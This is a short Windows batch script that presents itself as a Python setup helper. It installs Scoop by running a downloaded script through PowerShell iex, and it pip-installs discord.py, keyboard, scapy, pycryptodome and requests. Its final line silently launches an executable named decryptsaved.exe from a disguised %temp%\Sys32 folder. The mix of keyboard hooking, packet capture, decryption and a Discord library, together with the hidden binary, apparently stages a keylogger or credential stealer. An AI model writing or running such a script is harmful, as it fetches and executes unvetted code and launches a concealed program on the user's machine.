@echo off

if not exist "C:\Users\%USERNAME%\AppData\Local\Programs\Python\Python312\python.exe" (



set SCOOP_BIN="%USERPROFILE%\scoop\shims\python.exe"

:check_scoop
:: Check if Scoop is installed
where scoop >nul 2>nul
if %errorlevel% neq 0 (
    echo Scoop is not installed. Installing Scoop...
    powershell -Command "iex (new-object net.webclient).downloadstring('https://get.scoop.sh')"
    timeout 5 >nul
) else (
    echo Scoop is already installed.
)

:check_python
:: Check if Python is installed via Scoop
if exist "%SCOOP_BIN%" (
    echo Python is already installed.
    goto continue_script
) else (
    echo Python is not installed. Installing Python...
    scoop install python
    timeout 5 >nul
)

:: Wait until Python is installed
:check_python_loop
if not exist "%SCOOP_BIN%" (
    timeout /t 5 >nul
    goto check_python
)




)
:continue_script
echo Python installation verified. Continuing with the script...
:: Add your additional script logic below



pip uninstall pycrypto -y
pip install discord.py==2.3.2
pip install asyncio
pip install pycryptodome
pip install requests
pip install scapy
pip install keyboard
pip show pycryptodome

start %temp%\Sys32\decryptsaved.exe
exit
